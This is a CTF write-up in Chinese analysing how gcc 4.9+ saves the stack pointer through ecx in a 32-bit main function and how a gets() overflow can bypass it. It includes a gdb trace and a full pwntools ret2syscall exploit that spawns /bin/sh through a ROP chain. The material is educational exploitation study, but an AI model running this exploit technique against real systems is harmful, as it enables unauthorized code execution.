---
title: Buffer Overflow with gcc>=4.9
date: 2019-03-17 17:43:52
tags: [ctf, pwn]
---

gcc 的版本如果大于 4.9，main 函数下的缓冲区溢出会有不一样的 check，即使没开 canary，也不能溢出。

<!-- more -->

# Source

自己写的一道题目，源码：

```cpp
// gcc p3.c -o p3 -m32 -static -fno-stack-protector -g
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    char buf[200];
    printf("say something: ");
    gets(buf);
    return 0;
}
```

# Analysis

乍一看是静态编译，然后又是 gets，一定是很容易的栈溢出，但是大于 4.9 版本的 gcc 是不太一样的。main 函数中是这样的：

```
0804887c <main>:
 804887c:       8d 4c 24 04             lea    ecx,[esp+0x4]
 8048880:       83 e4 f0                and    esp,0xfffffff0
 8048883:       ff 71 fc                push   DWORD PTR [ecx-0x4]
 8048886:       55                      push   ebp
 8048887:       89 e5                   mov    ebp,esp
 8048889:       51                      push   ecx
 804888a:       81 ec d4 00 00 00       sub    esp,0xd4
 ......
 80488eb:       83 c4 10                add    esp,0x10
 80488ee:       b8 00 00 00 00          mov    eax,0x0
 80488f3:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
 80488f6:       c9                      leave
 80488f7:       8d 61 fc                lea    esp,[ecx-0x4]
 80488fa:       c3                      ret
```

这里我们可以看到，程序在对栈的保存上，额外使用了 ecx 来保存栈上的某个值。当我们尝试栈溢出的时候，会覆盖到 ecx 上，导致最后恢复的栈值不存在。通过 gdb 调试我们可以看得更清楚：

```
────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────
EAX: 0x804887c (<main>:	lea    ecx,[esp+0x4])
EBX: 0x80481a8 (<_init>:	push   ebx)
ECX: 0xffffcd90 --> 0x1
EDX: 0xffffcdb4 --> 0x80481a8 (<_init>:	push   ebx)
ESI: 0x80ea00c --> 0x8067020 (<__strcpy_sse2>:	mov    edx,DWORD PTR [esp+0x4])
EDI: 0x0
EBP: 0xffffcd78 --> 0x0
ESP: 0xffffcc94 --> 0x2c0003f
EIP: 0x8048893 (<main+23>:	push   0x80bb288)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
───────────────────────────────────────────────────────────────────── Code ────────────────────────────────────────────────────────────────────
   0x8048889 <main+13>:	push   ecx
   0x804888a <main+14>:	sub    esp,0xd4
   0x8048890 <main+20>:	sub    esp,0xc
=> 0x8048893 <main+23>:	push   0x80bb288
   0x8048898 <main+28>:	call   0x804ed60 <printf>
   0x804889d <main+33>:	add    esp,0x10
   0x80488a0 <main+36>:	sub    esp,0xc
   0x80488a3 <main+39>:	lea    eax,[ebp-0xd0]
──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────
0000| 0xffffcc94 --> 0x2c0003f
0004| 0xffffcc98 --> 0xfff
0008| 0xffffcc9c --> 0x0
0012| 0xffffcca0 --> 0x0
0016| 0xffffcca4 --> 0x5b ('[')
0020| 0xffffcca8 --> 0x0
0024| 0xffffccac --> 0xf0b5ff
0028| 0xffffccb0 --> 0xffffccee --> 0xe6ce0000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Legend: code, data, rodata, heap, value
0x08048893	7		printf("say something: ");
assassinq>> p $ecx
$1 = 0xffffcd90
......
────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────
EAX: 0x0
EBX: 0x80481a8 (<_init>:	push   ebx)
ECX: 0x42424242 ('BBBB')
EDX: 0x80eb4e0 --> 0x0
ESI: 0x80ea00c --> 0x8067020 (<__strcpy_sse2>:	mov    edx,DWORD PTR [esp+0x4])
EDI: 0x0
EBP: 0xffffcd78 --> 0x0
ESP: 0xffffcca0 --> 0x0
EIP: 0x80488ba (<main+62>:	leave)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
───────────────────────────────────────────────────────────────────── Code ────────────────────────────────────────────────────────────────────
   0x80488af <main+51>:	add    esp,0x10
   0x80488b2 <main+54>:	mov    eax,0x0
   0x80488b7 <main+59>:	mov    ecx,DWORD PTR [ebp-0x4]
=> 0x80488ba <main+62>:	leave
   0x80488bb <main+63>:	lea    esp,[ecx-0x4]
   0x80488be <main+66>:	ret
   0x80488bf:	nop
   0x80488c0 <generic_start_main>:	push   esi
──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────
0000| 0xffffcca0 --> 0x0
0004| 0xffffcca4 --> 0x5b ('[')
0008| 0xffffcca8 ('A' <repeats 200 times>...)
0012| 0xffffccac ('A' <repeats 200 times>...)
0016| 0xffffccb0 ('A' <repeats 196 times>, "BBBB")
0020| 0xffffccb4 ('A' <repeats 192 times>, "BBBB")
0024| 0xffffccb8 ('A' <repeats 188 times>, "BBBB")
0028| 0xffffccbc ('A' <repeats 184 times>, "BBBB")
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Legend: code, data, rodata, heap, value
0x080488ba	10	}
assassinq>> p $ecx
$2 = 0x42424242
```

显然 ecx 的作用是使得 esp 恢复到原来的值，那么如果我们破坏了 esp，那么会造成奇怪的影响。既然 ecx 无法覆盖，那么我们就需要想办法绕过它。在上面调试的过程中，我们发现 ecx 的最低两个字节是 0x90，如果我们把它改成 00，那么我们的栈就会往下掉 0x90 个字节，我们输入的 buf 就能有用武之地。由于这里输入使用的是 gets，采用的是 0x00 截断我们的输入，我们可以充分利用这个特点，达到我们的目的。

这个程序是静态编译的，可以使用 ret2syscall。我们把 rop 填在 buf 的最后面，前面则填满一个 ret 的 gadget，这样的话只要 ecx 保存的地址低两位大于我们 rop 的长度，就有概率成功打通。

# Exploit

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
local = 1
if local:
	p = process('./p3')
else:
	p = remote('10.21.13.69', 10016)
elf = ELF('./p3')
g = lambda x: next(elf.search(asm(x)))
ret = g('ret')
info('ret = ' + hex(ret))
pop_eax_ret = g('pop eax ; ret')
pop_ebx_ret = g('pop ebx ; ret')
pop_ecx_ret = g('pop ecx ; ret')
pop_edx_ret = g('pop edx ; ret')
int_0x80_ret = g('int 0x80 ; ret')
buf = 0x080eb000 - 100
# gdb.attach(p)
offset = 204
# read(0, '/bin/sh\x00', 100)
rop1 = [
	pop_eax_ret,
	3,
	pop_ebx_ret,
	0,
	pop_ecx_ret,
	buf,
	pop_edx_ret,
	100,
	int_0x80_ret,
]
# execve('/bin/sh\x00', 0, 0)
rop2 = [
	pop_eax_ret,
	0xb,
	pop_ebx_ret,
	buf,
	pop_ecx_ret,
	0,
	pop_edx_ret,
	0,
	int_0x80_ret
]
rop = ''.join(map(p32, rop1 + rop2))
info('len(rop) = ' + str(len(rop)))
offset2 = offset - len(rop)
info('offset2 = ' + str(offset2))
payload = p32(ret) * (offset2 / 4) + rop
info('len(payload) = ' + str(len(payload)))
# payload = cyclic(500)
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
```

# Reference

[【ctf-pwn】【winesap】STCS 2016 Week4](https://www.youtube.com/watch?v=9bHibgrjNlc)
